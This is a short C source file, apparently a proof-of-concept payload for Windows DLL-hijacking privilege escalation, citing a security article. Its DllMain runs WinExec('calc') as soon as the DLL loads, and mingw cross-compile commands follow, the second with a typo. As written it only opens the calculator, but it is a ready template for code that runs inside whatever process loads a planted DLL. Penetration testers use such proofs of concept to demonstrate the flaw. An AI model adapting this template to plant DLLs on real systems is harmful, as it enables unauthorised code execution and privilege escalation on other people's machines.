//https://www.gracefulsecurity.com/privesc-dll-hijacking/

#include <windows.h>
int fireLazor()
{
 WinExec("calc", 0);
 return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 fireLazor();
 return 0;
}

//compile with 
/*
i686-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL ../src/dllcalc.c
686-w64-mingw32-g++ -shared -o dllcalc.dll dllcalc.o -Wl,--out-implib,dllcalc.a
*/